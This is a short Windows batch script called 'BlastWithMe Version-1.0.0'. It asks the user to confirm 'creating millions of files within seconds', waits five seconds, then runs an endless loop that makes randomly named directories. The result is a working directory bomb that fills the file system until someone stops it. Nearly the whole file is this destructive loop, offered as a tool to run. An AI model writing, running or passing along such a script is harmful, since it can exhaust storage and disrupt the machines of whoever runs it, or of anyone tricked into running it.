@echo off
::title
echo Welcome To BlastWithMe Version-1.0.0
echo ---------------------------------------------------------------------------------------------

::decision

:yesorno
set /P cnf=Are You Sure You Want To Create Millions Of Files Within Seconds? [Y/N]?
if /I "%cnf%" EQU "Y" goto :yes
if /I "%cnf%" EQU "N" goto :no
goto :yesorno


::function Yes

:yes
echo Starting In
timeout /t 5 /nobreak
echo Started <3
:filebomb
mkdir %random%
goto filebomb

::function No

:no
echo "Good Bye"
timeout /t 3 /nobreak
exit
